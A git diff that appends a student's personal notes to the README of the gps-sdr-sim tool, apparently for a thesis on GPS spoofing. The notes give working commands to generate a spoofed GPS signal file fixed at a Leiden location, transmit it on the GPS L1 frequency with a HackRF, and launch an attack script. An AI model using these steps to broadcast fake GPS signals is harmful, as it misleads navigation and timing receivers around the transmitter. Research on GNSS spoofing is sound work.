@@ -189,3 +189,36 @@ Default 3.0MHz. Applicable range 1.0MHz to 5.0MHz.
 
 Copyright &copy; 2015-2025 Takuji Ebinuma  
 Distributed under the [MIT License](http://www.opensource.org/licenses/mit-license.php).
+
+### Notes Dario
+Merge the satellite constellation positition (in `brdc` file) with location data (static)
+Merge static location in Leiden to create 100 second duration binary
+```bash
+attacks/gps_spoof/gps-sdr-sim -e attacks/gps_spoof/rinex_files/brdc0660.26n -l 52.1651025538376,4.480019798057265 -s 2600000 -d 100 -o attacks/gps_spoof/loc_bins/leiden_static_100.bin 
+```
+- `-e`: satellite constellation file (for a specific day)
+- `-l`: hardcoded location data
+- '
+- `-d`: Duration in seconds
+- `-o`: Binary I/Q output file
+
+Move to gps_spoofing directory in `radioconda`
+```bash
+cd  C:\Projects\thesis_programs\gps_spoofing\attacks\
+```
+Use `radioconda prompt` to generate radiowaves in hackrf by broadcasting on antenna
+```bash
+hackrf_transfer -t dordrecht_static.bin -f 1575420000 -s 2600000 -a 0 -x 0
+```
+- `-t`: transmit data from <filename>
+- `-f`: Transmit at specific frequency (1MHz-6000MHz)
+- `-s`: Sample rate in Hz  (2-20MHz)
+- `-a`: Enable/disable RX/TX RF amplifier
+- `-x`: TX VGA (IF) gain (0-47dB)
+
+Start attack and save times
+```
+C:/Projects/thesis_programs/gps_spoofing/.venv-1/Scripts/Activate.ps1
+
+python start_attack.py
+`
